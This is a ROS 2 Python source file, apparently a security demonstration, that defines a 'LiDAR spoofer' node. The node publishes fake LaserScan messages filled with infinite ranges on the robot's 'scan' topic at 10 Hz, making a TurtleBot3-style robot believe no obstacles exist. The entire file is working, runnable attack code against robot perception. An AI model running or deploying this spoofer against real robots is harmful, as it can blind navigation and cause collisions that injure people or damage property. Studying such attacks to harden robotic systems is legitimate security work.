# security_examples/lidar_spoofer.py
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import LaserScan
import math

class LidarSpooferNode(Node):
    """
    This node spoofs LiDAR data by publishing LaserScan messages
    with infinite range values, effectively making the robot "blind"
    by making it believe there are no obstacles around it.
    """
    def __init__(self):
        super().__init__('lidar_spoofer')
        # Publish to the standard '/scan' topic for LiDAR data
        self.publisher_ = self.create_publisher(LaserScan, 'scan', 10)
        
        # Publishing at 10 Hz is a realistic frequency for a LiDAR sensor
        timer_period = 0.1  # seconds (10 Hz)
        self.timer = self.create_timer(timer_period, self.timer_callback)
        
        # Log a warning to the console that this malicious node is active
        self.get_logger().warn('!!! LiDAR Spoofer Node ACTIVE - Publishing fake empty scans!!!')

    def timer_callback(self):
        # Create a new LaserScan message
        scan_msg = LaserScan()
        
        # Get the current time for the message header
        now = self.get_clock().now()
        scan_msg.header.stamp = now.to_msg()
        
        # Set the frame_id to match the TurtleBot3's LiDAR frame
        scan_msg.header.frame_id = 'base_scan'

        # --- Configure Fake Scan Parameters ---
        # These values mimic a standard 360-degree LiDAR
        scan_msg.angle_min = 0.0
        scan_msg.angle_max = 2.0 * math.pi
        scan_msg.angle_increment = (2.0 * math.pi) / 360.0 # One reading per degree
        scan_msg.time_increment = 0.0 # Can be left at 0 for this spoof
        scan_msg.scan_time = 0.1 # Corresponds to our 10 Hz rate
        scan_msg.range_min = 0.12 # Realistic minimum range
        scan_msg.range_max = 3.5  # Realistic maximum range

        # --- Generate Malicious Data ---
        # Create a list of 360 readings.
        # Fill the list with 'inf' to signal that no obstacle is detected
        # in any direction. This is the core of the spoof.
        num_readings = 360
        scan_msg.ranges = [float('inf')] * num_readings
        
        # Also fill the intensities array if needed (optional)
        # scan_msg.intensities = [0.0] * num_readings

        # Publish the fake message
        self.publisher_.publish(scan_msg)

def main(args=None):
    rclpy.init(args=args)
    lidar_spoofer = LidarSpooferNode()
    rclpy.spin(lidar_spoofer)
    
    # Cleanup
    lidar_spoofer.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
